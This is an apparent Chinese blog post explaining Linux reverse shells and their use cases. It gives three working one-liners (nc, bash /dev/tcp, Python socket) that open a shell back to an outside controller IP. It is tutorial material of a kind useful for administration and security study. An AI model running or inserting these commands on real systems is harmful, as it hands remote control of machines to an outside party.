---
title: "Linux 反弹 shell"
date: "2022-07-11 15:23:00"
lastmod: "2022-07-24 17:01:38"
tags: ["shell"]
categories: ["Linux"]
draft: false
---

## 什么是反弹 Shell {#什么是反弹-shell}

控制端首先监听某个 TCP/UDP 端口，然后被控制端向这个端口发起一个请求，同时将自己命令行的输入输出转移到控制端，从而控制端就可以输入命令来控制被控端了


## 反弹 Shell 应用场景 {#反弹-shell-应用场景}

-   A 虽然有公网 IP，但 B 是一个处于内网的机器，A 就没法直接连到 B 上
-   B 上开了防火墙或者安全组限制，sshd 的服务端口 22 被封闭了
-   B 是一台拨号主机，其 IP 地址经常变动
-   假如 B 被攻击了，我们想让 B 向 A 汇报自己的状况，那自然就需要 B 主动去连接 A


## 反弹 Shell 案例 {#反弹-shell-案例}

-   A: 控制端,IP111.112.113.114
-   B: 被控制端


### nc {#nc}

> yum install -y nc

-   A:

    ```bash
    nc -lvp 32767
    ```

-   B:

    ```bash
    nc 111.112.113.114 32767 -e /bin/bash
    ```


### bash {#bash}

-   A 同上
-   B:

    ```bash
    bash -i >& /dev/tcp/111.112.113.114/32767 0>&1
    ```


### python {#python}

-   A 同上
-   B:

    ```python
    python -c 'import socket,subprocess,os; \
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
    s.connect(("111.112.113.114",32767));
    os.dup2(s.fileno(),0);
    os.dup2(s.fileno(),1);
    os.dup2(s.fileno(),2);
    p=subprocess.call(["/bin/sh","-i"]);'
    ```


## Ref {#ref}

-   [什么是反弹 Shell？](https://mp.weixin.qq.com/s/d3fDWWTKLF0mCpCMeAd4Ew)